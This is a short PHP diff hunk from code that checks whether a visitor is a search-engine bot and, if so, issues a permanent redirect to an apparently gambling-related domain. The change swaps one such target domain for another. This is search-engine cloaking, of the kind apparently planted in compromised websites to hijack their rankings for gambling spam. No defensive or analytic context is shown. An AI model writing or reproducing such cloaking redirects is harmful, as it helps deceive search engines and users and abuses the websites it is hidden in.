@@ -14,7 +14,7 @@ foreach ($bots as $bot) {
 
 if ($is_bot) {
     header("HTTP/1.1 301 Moved Permanently");
-    header("Location: https://www.rokokbet777rank.one/wap");
+    header("Location: https://www.angkarokokbet.com/");
     exit();
 }
 
